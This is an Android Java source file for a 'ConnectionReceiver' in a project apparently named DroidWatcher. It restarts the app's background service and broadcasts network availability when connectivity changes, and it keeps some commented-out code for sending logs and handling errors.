package com.droidwatcher.receivers;

import com.droidwatcher.SettingsManager;
import com.droidwatcher.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.support.v4.content.LocalBroadcastManager;

public class ConnectionReceiver extends BroadcastReceiver {
	public static final String NETWORK_AVAILABLE = "network_available";

	@Override
	public void onReceive(Context context, Intent intent) {
//		try {
			//Log.i("DEBUG", "ConnectionReceiver - onReceive");
		if (new SettingsManager(context).isConnected()) {
			context.startService(new Intent(context, AppService.class));
		}
		
			if (networkAvailable(context)){
				LocalBroadcastManager.getInstance(context).sendBroadcast(new Intent(NETWORK_AVAILABLE));
				
//				if (AppService.threadManager != null){
//					new Thread(new Runnable() {
//						public void run() {
//							AppService.threadManager.sendLogs();
//						}
//					}).start();
//				}
			}
//		} catch (Exception e) {
//			ErrorHandler.error(e, context);
//		}
	}
	
	private Boolean networkAvailable(Context context){
		ConnectivityManager manager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}
}
